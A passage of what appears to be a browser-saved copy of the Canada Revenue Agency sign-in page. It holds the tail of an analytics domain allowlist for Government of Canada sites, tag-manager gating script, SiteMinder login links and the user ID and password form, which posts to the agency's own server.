        ,'aatesting-penweb.work.int.jea-engr.ca'
        ,'bravopenweb07.dev.jea.lan'
        ,'beta.sosa.canadabuys.canada.ca'
        ,'beta.ocama.achatscanada.canada.ca'
	// Global Affiars Canada
		,'www.international.gc.ca'
		,'international.gc.ca'
		,'www.tradecommissioner.gc.ca'
		,'www.deleguescommerciaux.gc.ca'
		,'travel-ace-m2'
		,'voyage-ace-m2' 
		,'travel.gc.ca'
		,'voyage.gc.ca' 
		,'core-ombuds.canada.ca'
		,'deleguescommerciaux.gc.ca'
		,'www.educanada.ca'
    // Justice
		,'www-uat.justice.gc.ca'
		,'limsdev.justice.gc.ca'
		,'dmteam-uat.justice.gc.ca'
		,'equipesm-uat.justice.gc.ca'
		,'www-uat.victimsfirst.gc.ca'
		,'www-uat.victimesdabord.gc.ca'
		,'jusnet-uat.justice.gc.ca'
		,'www-uat.victimsweek.gc.ca'
		,'www-uat.semainedesvictimes.gc.ca'
		,'www.justice.gc.ca'
		,'justice.gc.ca'
		,'dmteam.justice.gc.ca'
		,'equipesm.justice.gc.ca'
		,'www.laws-lois.justice.gc.ca'
		,'laws-lois.justice.gc.ca'
		,'lois-laws.justice.gc.ca'
		,'www.lois-laws.justice.gc.ca'
		,'www.ppsc.gc.ca'
		,'ppsc.gc.ca'
		,'www.victimsweek.gc.ca'
		,'www.semainedesvictimes.gc.ca'
		,'victimsweek.gc.ca'
		,'semainedesvictimes.gc.ca'
		,'jusnet.justice.gc.ca'
        ,'ifolio.justice.gc.ca:444'
        ,'www.ifolio.justice.gc.ca:444'
	// Canadian Food Inspection Agency
		,'inspection.gc.ca'
		,'www.inspection.gc.ca'
		,'inspection.canada.ca'
		,'www.inspection.canada.ca'
		,'active.inspection.gc.ca'
		,'www.active.inspection.gc.ca'
		,'merlin.cfia-acia.inspection.gc.ca'
		,'apps.merlin.cfia-acia.inspection.gc.ca'
		,'www.apps.merlin.cfia-acia.inspection.gc.ca'
		,'inspection.canada.ca'
	// Public Safety Canada
		,'infomediadev'
		,'infomedia.gc.ca'
		,'www.infomedia.gc.ca'
		,'beta.infomedia.gc.ca'
		,'api.infomedia.gc.ca'
		,'icdev'
		,'psdev'
		,'gpdev'
		,'psdev'
		,'gpdev'
		,'ecdev'
		,'icdev'
		,'publicsafety.gc.ca'
		,'www.publicsafety.gc.ca'
		,'securitepublique.gc.ca'
		,'www.securitepublique.gc.ca'
		,'getprepared.gc.ca'
		,'www.getprepared.gc.ca'
		,'preparez-vous.gc.ca'
		,'www.preparez-vous.gc.ca'
		,'erc-cee.gc.ca'
		,'www.erc-cee.gc.ca'
		,'infocentral'
		,'infocentrale'
		,'infocentral'
	// RCMP External Review Committee
		,'ercdev'
	// Open Government
		,'staging.open.canada.ca'
		,'stadification.ouvert.canada.ca'
		,'open.canada.ca'
		,'ouvert.canada.ca'
		,'search.open.canada.ca'
		,'rechercher.ouvert.canada.ca'
	// Correctional Investigator Canada
		,'www.oci-bec.gc.ca'
		,'oci-bec.gc.ca'
	//Public Service Commission
		,'intracom'
		,'intradev'
		,'intracom.psc-cfp.gc.ca'
		,'extranet.psc-cfp.gc.ca'
		,'devextranet.psc-cfp.gc.ca'
		,'test-psjobs-emploisfp.psc-cfp.gc.ca'
		,'emploisfp-psjobs.cfp-psc.gc.ca'
        ,'test-psjobs-emploisfp.psc-cfp.gc.ca'
        ,'test-emploisfp-psjobs.cfp-psc.gc.ca'
	//Superintendent of Financial Institutions Canada (Office of the)
		,'devirppub.devosfi.ca'
		,'uatirppub.devosfi.ca'
		,'uatirppub.osfi-bsif.gc.ca'	
		,'uatirppub.devosfi.ca'	
	//Women and Gender Equality Canada	
		,'canada/testing/page1-fr.html'	
		,'canada/testing/page1-en.html'	
		,'intranettest'	
	//Canadian Space Agency
		,'devcorpo'
		,'asc-csa.gc.ca'
		,'www.asc-csa.gc.ca'
		,'csa-asc.gc.ca'
		,'www.csa-asc.gc.ca'
   //ePassport App
        ,'web.passport-online-staging.apps.cic.gc.ca'
        ,'web.passport-online-development.apps.cic.gc.ca'
   //Shared Service Canada
        ,'plus-test.ssc-spc.gc.ca'
        ,'plus.ssc-spc.gc.ca'
        ,'www.plus.ssc-spc.gc.ca'
  //Communications Security Establishment
        ,'dev-cse-cst.hiringplatform.ca'
	

 ]
};




/* ===== Set data elements that rely on allowlist ===== */

/*jsAbort START*/
var list;
var h = document.location.hostname.toLowerCase(); //host
var j = document.location.pathname.toLowerCase(); //path

if (_satellite.environment.stage == "production") {
    list = _satellite.gcCustom.domain_allowlist.live;
}
else {
    list = _satellite.gcCustom.domain_allowlist.stage;
    //list = _satellite.gcCustom.domain_allowlist.live; //FOR TESTING ON LIVE ONLY! REMOVE

}

//directories/domains to exclude
//Input list. Each item must be inputed with its own quotation marks and be separted using a comma
// excl list cannot be empty
// list can be domains or directories
excl = _satellite.gcCustom.domain_blocklist

var j = document.location.host + document.location.pathname.toLowerCase(); //path
var toExcl = false; //set to false by default
for (var i in excl) {
    if (j.indexOf(excl[i]) > -1) {
        toExcl = true;
    }
}
//end directory exclusions

//sets the data element
if (typeof list[h] === 'undefined' || toExcl === true) {
    _satellite.setVar('jsAbort', 'true'); //set to true prevents rules from firing
    window.blockList = 'yes';
    _satellite.cookie.set('prev_page_blockList', 'yes')
}
else if (toExcl === false) {
    _satellite.setVar('jsAbort', 'false'); //set to false allows rules to fire
    window.blockList = 'no';
}
/*jsAbort END*/

</script>
    


<!--[if gte IE 9 | !IE ]><!-->
<link rel="apple-touch-icon" sizes="57x57 72x72 114x114 144x144 150x150" class="wb-favicon" href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon-mobile.png"><link href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon.ico" rel="icon" type="image/x-icon" class="wb-init wb-favicon-inited">
<link rel="stylesheet" href="./CRA_files/theme.min.css">
<!--<![endif]-->
<!--[if lt IE 9]>
<link href="/ebci/wet/v5.0.1/GCWeb/assets/favicon.ico" rel="shortcut icon" />
<link rel="stylesheet" href="/ebci/wet/v5.0.1/GCWeb/css/ie8-theme.min.css" />
<script src="/ebci/wet/v5.0.1/wet-boew/js/jquery/1.11.1/jquery.min.js"></script>
<script src="/ebci/wet/v5.0.1/wet-boew/js/ie8-wet-boew.min.js"></script>
<![endif]-->
<noscript>
    <link rel="stylesheet" href="/ebci/wet/v13.7.2/wet-boew/css/noscript.min.css" />
</noscript>



<link rel="stylesheet" href="./CRA_files/apps.css">
<link rel="stylesheet" href="./CRA_files/common.css">
<link rel="stylesheet" href="./CRA_files/cms2.css">
<script src="./CRA_files/amssUtils.js.download"></script>



<script type="text/javascript">
	/* 
		Note: the messages are built inside a jsp so that the messages are formatted to the appropriate locale (eng, fr).
	*/
	var accessibilityMessages=new Array();
	accessibilityMessages["showPassword"]="Show Password";
	accessibilityMessages["hidePassword"]="Hide Password";
	accessibilityMessages["showAnswer"]="Show Answer";
	accessibilityMessages["hideAnswer"]="Hide Answer";
</script>

<link rel="stylesheet" href="chrome-extension://ihcjicgdanjaechkgeegckofjjedodee/app/content-style.css"></head>

<body vocab="http://schema.org/" typeof="WebPage">

	<ul id="wb-tphp" class="wb-init wb-disable-inited">
		<li class="wb-slc">
			
			 
			<a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP%3a%2f%2fcms--sgj%2ecra--arc%2egc%2eca%2fgol--ged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d--SM--u-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d--SM--HTTP-%3a-%2f-%2fcms----sgj-%2ecra----arc-%2egc-%2eca-%2fgol----ged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp---%3A---%2F---%2Fwww-%2ew3-%2eorg---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy#cont" class="wb-sl">Skip to main content</a>
		</li>
		<li class="wb-slc visible-sm visible-md visible-lg">
			 
			<a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/%7D" class="wb-sl">Skip to "About this site"</a>
		</li>
		
	<li class="wb-slc"><a class="wb-sl" href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u+l/c0bDuFqdbz6ofgybxcQlkO+y5jWhT9+wwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP://cms--sgj.cra--arc.gc.ca/gol--ged/awsc/cms/macauth?TYPE=33554432&amp;REALMOID=06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=--SM--u-+l-/c0bDuFqdbz6ofgybxcQlkO-+y5jWhT9-+wwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=--SM--HTTP-:-/-/cms----sgj-.cra----arc-.gc-.ca-/gol----ged-/awsc-/cms-/postlogin-?SAMLRequest-=fZBPS8QwEMXv---+ylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---+Jg3836vOszhbB---/U---+6wwkK---/RWKzp7K1wgBqFhVGhCFI8Hu5uBU---+ZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---+lwq2fdvnO1aWXVzFe0DUH---+pqRpzVyWIAG2rKGS---+SnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---+p8GRBT---+byE---+Vv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---=---=-&amp;RelayState-=3542d42435a8a4c21cf64d7e90d94a54fb511eff-&amp;SigAlg-=http---:---/---/www-.w3-.org---/2001---/04---/xmldsig----more---#rsa----sha256-&amp;Signature-=wdb8kpznrwrYyJQknVWX3f7bkgh07PoT---/wvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---/NW---+PXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---+QS6pmMiFftNA---+02UwxWYy6rKizMtP---+2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---/VvuA6KLY---+ByoLaBQGiZpa04jVbj2Au4wxBX---+Hi---+TXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---/jZ17---+fczr7Lay3KHWZoiVKVUhZdvxA---=---=-&amp;SMPORTALURL-=3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---/eXB9Z---/egu2zyozy&amp;wbdisable=true" rel="alternate">Switch to basic HTML version</a></li></ul>
	
	<header>
        <div id="wb-bnr" class="container">
            <section id="wb-lng" class="visible-md visible-lg text-right">
                <h2 class="wb-inv">Language selection</h2>
                <ul class="list-inline margin-bottom-none">
                    <li>
                        <div lang="fr">
                        	
                            <a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/languageToggle">Fran�ais</a>
                        </div>
                    </li>
                </ul>
            </section>
            <div class="row">
                
                <div class="brand col-xs-9 col-sm-5 col-md-4" property="publisher" resource="#wb-publisher" typeof="GovernmentOrganization">
	                
	                <img alt="" src="./CRA_files/sig-blk-en.svg" property="logo">
	                <span class="wb-inv" property="name"> Government of Canada / <span lang="fr">Gouvernement du Canada</span></span>
	                <meta property="name" content="Government of Canada">
	                <meta property="areaServed" typeof="Country" content="Canada">
	                <link property="logo" href="./CRA_files/wmms-blk.svg">
            	</div>
                <section class="wb-mb-links col-xs-4 col-sm-3 visible-sm visible-xs" id="wb-glb-mn">
                    
                    <h2>Menu</h2>
                    <ul class="list-inline text-right chvrn">
                        <li>
                        	
                            <a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP%3a%2f%2fcms--sgj%2ecra--arc%2egc%2eca%2fgol--ged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d--SM--u-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d--SM--HTTP-%3a-%2f-%2fcms----sgj-%2ecra----arc-%2egc-%2eca-%2fgol----ged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp---%3A---%2F---%2Fwww-%2ew3-%2eorg---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy#mb-pnl" class="overlay-lnk" title="Menu" role="button" aria-controls="mb-pnl"><span class="glyphicon glyphicon-th-list">
                                    <span class="wb-inv">Menu</span>
                                </span></a>
                        </li>
                    </ul>
                    <div id="mb-pnl" class=" wb-overlay modal-content overlay-def wb-panel-r wb-overlay-inited" aria-hidden="true"><header class="modal-header"><div class="modal-title">Menu</div></header><div class="modal-body"><section class="lng-ofr"><h3>Language selection</h3><ul class="list-inline">
                        <div lang="fr">
                        	
                            <li><a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/languageToggle">Fran�ais</a></li>
                        </div>
                    </ul></section><nav role="navigation" typeof="SiteNavigationElement" id="info-pnl" class="info-pnl wb-menu wb-menu-inited wb-init"><h3>About this site</h3><ul class="list-unstyled mb-menu" role="menu"><li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3" aria-posinset="1" tabindex="0" href="https://www.canada.ca/en/transparency/terms.html" rel="noopener noreferrer" target="_blank">Terms and conditions</a></li><li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3" aria-posinset="2" tabindex="-1" href="https://www.canada.ca/en/transparency/privacy.html" rel="noopener noreferrer" target="_blank">Privacy</a></li><li class="no-sect"><a class="mb-item" role="menuitem" aria-setsize="3" aria-posinset="3" tabindex="-1" href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login?TYPE=33554432&amp;REALMOID=06-26a97681-2e5a-105d-9505-84cb2b4afb5e&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=-SM-u%2bl%2fc0bDuFqdbz6ofgybxcQlkO%2by5jWhT9%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo&amp;TARGET=-SM-HTTP%3a%2f%2fcms--sgj%2ecra--arc%2egc%2eca%2fgol--ged%2fawsc%2fcms%2fmacauth%3fTYPE%3d33554432%26REALMOID%3d06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d--SM--u-%2bl-%2fc0bDuFqdbz6ofgybxcQlkO-%2by5jWhT9-%2bwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3d--SM--HTTP-%3a-%2f-%2fcms----sgj-%2ecra----arc-%2egc-%2eca-%2fgol----ged-%2fawsc-%2fcms-%2fpostlogin-%3fSAMLRequest-%3dfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3d3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3dhttp---%3A---%2F---%2Fwww-%2ew3-%2eorg---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3d3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy#web-cont">Top of Page <span class="glyphicon glyphicon-chevron-up"></span></a></li></ul></nav></div><div class="modal-footer"><button title="Close overlay" class="btn btn-sm btn-primary pull-left overlay-close" type="button">Close<span class="wb-inv">Close overlay</span></button></div><button title="Close: Menu (escape key)" class="mfp-close overlay-close" type="button">�<span class="wb-inv"> Close: Menu (escape key)</span></button></div>
                </section>
                
            </div>
        </div>
		
		
		
		<div id="brand-container-cra">
			<div class="container">
				<div class="row">
					<div class="col-xs-12 col-sm-10" id="brand-text-cra">
						Canada Revenue Agency
					</div>
					
					<div class="col-xs-4 col-sm-2 text-right">
						
					</div>
				</div>
			</div>
		</div>
		
		
        
        
        
        
        <span data-trgt="mb-pnl" class="wb-menu hide wb-init wb-menu-inited wb-navcurr-inited" id="wb-auto-2"></span>
    </header>

<main role="main" property="mainContentOfPage" class="container">

 


  
     
	
	
   
	
	<div class="center">
	<script type="text/javascript">
		document.title = "Canada Revenue Agency -  CRA Sign in";
	</script>
	
	<div id="content">
	
		

		<h1 id="wb-cont">
			CRA Sign in
		</h1>
		
				
		
		<script src="./CRA_files/api.js.download" async="" defer=""></script>
		
		<form id="mandatoryErrorForm" action="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login/mandatoryError" method="post" autocomplete="off">
			<div>
				<input type="hidden" id="useridErrorField" name="useridError">
				<input type="hidden" id="passwordErrorField" name="passwordError">
				
				
			</div>
		</form>
		<form id="exitForm" action="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/logout" method="get" autocomplete="off">
		  <input type="hidden" name="target" value="cra-main">
		</form>
		<form id="userIdForm" action="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login/userIdCapture" method="post" autocomplete="off">
		  <input type="hidden" id="userIdFieldforCaptcha" name="userIdCaptcha">
		</form>
		<form id="loginForm" action="https://cms-sgj.cra-arc.gc.ca/static/pub/login.fcc" method="post" autocomplete="off" style="font-size:20px;">
			
			
				<input type="hidden" name="SMTRYNO" value="0">
				<input type="hidden" name="SMAUTHREASON" value="0">
				<input type="hidden" name="target" value="-SM-HTTP%3A%2F%2Fcms--sgj.cra--arc.gc.ca%2Fgol--ged%2Fawsc%2Fcms%2Fmacauth%3FTYPE%3D33554432%26REALMOID%3D06--00ba5d0a--2e5a--105d--9505--84cb2b4afb5e%26GUID%3D%26SMAUTHREASON%3D0%26METHOD%3DGET%26SMAGENTNAME%3D--SM--u-%2Bl-%2Fc0bDuFqdbz6ofgybxcQlkO-%2By5jWhT9-%2BwwR0m2ej8dGZuKsNKm5BjLwoIX4n2hhUn6bUBuJKOgGYv6HKppgXiIrgpQH4XG4MYVvkxxSdyQmUMtyZkunI1p32oGwBo%26TARGET%3D--SM--HTTP-%3A-%2F-%2Fcms----sgj-.cra----arc-.gc-.ca-%2Fgol----ged-%2Fawsc-%2Fcms-%2Fpostlogin-%3FSAMLRequest-%3DfZBPS8QwEMXv---%2BylC7m3TbPdPQ1tYWIQFBVHx4EWmadqNpEnNpOrHN1sPqxfn---%2BJg3836vOszhbB---%2FU---%2B6wwkK---%2FRWKzp7K1wgBqFhVGhCFI8Hu5uBU---%2BZmLwLTjpDyTE6tIWgna3pOYQJRZbJERMc3lLpIQEv00GmEi7qJ2bT3BotM4TRcERHyY3zUi0BatqDQUXJ6VjT177tFOvkZg1lsW93m37brtk---%2Blwq2fdvnO1aWXVzFe0DUH---%2BpqRpzVyWIAG2rKGS---%2BSnCeseGJc8FwUmxdKnpXHJXGEoc2KxKks5mLx---%2Bp8GRBT---%2BbyE---%2BVv5CThvjBm1TWLjhL3eVXS83qyr73XXzDQ---%3D---%3D-%26RelayState-%3D3542d42435a8a4c21cf64d7e90d94a54fb511eff-%26SigAlg-%3Dhttp---%3A---%2F---%2Fwww-.w3-.org---%2F2001---%2F04---%2Fxmldsig----more---%23rsa----sha256-%26Signature-%3Dwdb8kpznrwrYyJQknVWX3f7bkgh07PoT---%2FwvhT4C68n6Ojbc6Gh259pmpw3yKLhPnNLm1I7GbCsNotHy9ajwIRToRHUjkSH7Ib0vpzfi5Bh0VGafkG2E91OGUqhn2j---%2FNW---%2BPXQBkiVubMW1UNeMHSfV3ty1HTBM93XNYwdnJByCp---%2BQS6pmMiFftNA---%2B02UwxWYy6rKizMtP---%2B2h0i4fbqAcdNAB6fZpH8JOZTXEpryPqGtD---%2FVvuA6KLY---%2BByoLaBQGiZpa04jVbj2Au4wxBX---%2BHi---%2BTXB4DIZFQ0JCzPt0wKwdX1mnUEW6scH9AyFV---%2FjZ17---%2Bfczr7Lay3KHWZoiVKVUhZdvxA---%3D---%3D-%26SMPORTALURL-%3D3s3oC2jIJ0qEQ12Yiq9kAEjDKEUuKufwTJYavzvDtmH65tOSqAjOcKBbNnWrHFISoEmNt55oyAIlNgDZ---%2FeXB9Z---%2Fegu2zyozy">
				<input type="hidden" name="USER" id="user"> 
				<input type="hidden" name="h-captcha-response" id="h-captcha-response">
				
				
					<input type="hidden" name="SITEKEY" value="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2">
				
				<input type="hidden" name="IP" value="149.88.103.45">
				    
				
				

			    <div>
				    <div>
					
							
							<div class="form-group ">
								 
									
									
									
									
									
									
											
								    
								







<div>
	<label for="userid" class="required">
	
	
	
	    
	
		
			User ID
		
		
		
		
		
			    	<strong class="required"><i>(required)</i></strong>
	    	
		
		
				
		
		
		
     			
     </label>
</div>
								
								<input type="text" name="USERID" id="userid" class="form-control" autocomplete="off">
								<p>
									<a href="https://ams-sga.cra-arc.gc.ca/gol-ged/awsc/amss/enrol/useridrecovery">Forgot your user ID?</a>  
								</p>
						    </div>
						<div class="clear"></div>
						<div class="form-group ">
							
								
								
								
								
								
								
																	
														    
							







<div>
	<label for="password" class="required">
	
	
	
	    
	
		
			Password
		
		
		
		
		
			    	<strong class="required"><i>(required)</i></strong>
	    	
		
		
				
		
		
		
     			
     </label>
</div>
							<input class="form-control inline" type="password" name="PASSWORD" id="password" autocomplete="off">
							<i tabindex="0" role="button" aria-describedby="togglePasswordSpan" class="fa-solid fa-eye" style="margin-left: -40px; cursor: pointer;" id="togglePassword" title="Show Password"></i>
							<span class="sr-only" id="togglePasswordSpan">Show Password</span>

							<p>
								<a href="https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/recover/password/start">Forgot your password?</a>  
							</p>
						</div>
				</div>
				
				<div class="clear"></div>
				
			  	
			  	<p>
			  		For more information on how your privacy is protected, refer to our <a href="https://www.canada.ca/en/revenue-agency/services/e-services/cra-login-services/personal-information-collection-statement.html" target="_blank" rel="noopener noreferrer">Personal Information Collection Statement<span class="wb-inv">, opens in a separate window.</span></a>. 
			  	</p>
			  	
			  	
			  		<div class="alignCenter">
			  	    
